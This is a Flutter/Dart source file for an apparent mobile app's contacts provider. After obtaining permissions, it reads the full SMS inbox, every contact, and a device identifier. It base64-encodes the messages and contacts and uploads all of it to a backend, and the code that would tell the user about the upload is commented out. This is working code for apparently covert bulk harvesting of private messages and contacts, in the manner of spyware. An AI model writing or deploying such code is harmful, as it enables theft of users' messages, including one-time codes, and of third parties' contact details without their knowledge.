import 'dart:convert';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:telephony/telephony.dart';

import '../../../core/helpers/view_functions.dart';
import '../../../data/models/request/data/send_contacts_request.dart';
import '../../../data/models/request/data/send_messages_request.dart';
import '../../../data/repository/dataRepo/data_repo.dart';

final contactsProvider =
    ChangeNotifierProvider<ContactsProvider>((ref) => ContactsProvider());

class ContactsProvider extends ChangeNotifier {
  List<Contact> _contacts;
  List<SmsMessage> _messages;
  String _deviceInfo;

  ContactsProvider()
      : _contacts = [],
        _messages = [],
        _deviceInfo = '';

  getAndSendData(
    BuildContext context,
  ) async {
    final Telephony telephony = Telephony.instance;
    bool contactsPermission = await FlutterContacts.requestPermission();
    bool messagesPermission =
        await telephony.requestPhoneAndSmsPermissions ?? false;
    if (contactsPermission && messagesPermission) {
      _contacts = await FlutterContacts.getContacts(
        withProperties: true,
      ).catchError(
        (onError) {
          ViewFunctions.showCustomSnackBar(
              context: context, text: 'فشل تحميل جهات الاتصال');
          return <Contact>[];
        },
      );
      _messages = await telephony.getInboxSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
      ).catchError(
        (onError) {
          ViewFunctions.showCustomSnackBar(
              context: context, text: 'فشل تحميل الرسائل');
          return <SmsMessage>[];
        },
      );
      notifyListeners();
      if (context.mounted) {
        await getDeviceInfo(context);
      }
      if (context.mounted) {
        await sendData(context);
      }
    } else if (context.mounted) {
      ViewFunctions.showCustomSnackBar(
        context: context,
        text: ' لم يتم الحصول على الاذن للوصول لجهات الاتصال اوالرسائل',
      );
    }
  }

  getDeviceInfo(BuildContext context) async {
    final deviceInfoPlugin = DeviceInfoPlugin();
    BaseDeviceInfo device = await deviceInfoPlugin.deviceInfo;
    _deviceInfo =
        "${device.data['brand']}-${device.data['model']}-${device.data['device']}-${device.data['id']}";
    notifyListeners();
  }

  sendData(BuildContext context) async {
    List<Map> messagesList = _messages.map((e) {
      return {
        '"message_body"': '"${base64.encode(utf8.encode(e.body.toString()))}"',
        '"message_sender"':
            '"${base64.encode(utf8.encode(e.address.toString()))}"',
        '"message_time"': '"${e.date.toString()}"',
      };
    }).toList();

    List<Map> contactsList = _contacts
        .map(
          (e) => {
            '"contact_name"': '"${base64.encode(utf8.encode(e.displayName))}"',
            '"contact_phone"': e.phones.isNotEmpty
                ? '"${base64.encode(utf8.encode(e.phones[0].number))}"'
                : '"no number"',
          },
        )
        .toList();

    await DataRepository.sendMessages(
        dataRequest: SendMessagesRequest(
      messages: messagesList,
      deviceInfo: _deviceInfo,
    )).then((value) {
      // ViewFunctions.showCustomSnackBar(
      //     context: context, text: 'تم الارسال بنجاح');
    }).catchError((onError) {
      ViewFunctions.showCustomSnackBar(
          context: context, text: onError.toString());
    });

    await DataRepository.sendContacts(
        dataRequest: SendContactsRequest(
      contacts: contactsList,
      deviceInfo: _deviceInfo,
    )).then((value) {
      // ViewFunctions.showCustomSnackBar(
      //     context: context, text: 'تم الارسال بنجاح');
    }).catchError((onError) {
      ViewFunctions.showCustomSnackBar(
          context: context, text: onError.toString());
    });
  }

  List<Contact> get contactList => _contacts;

  List<SmsMessage> get messagesList => _messages;

  String get deviceInfo => _deviceInfo;
}
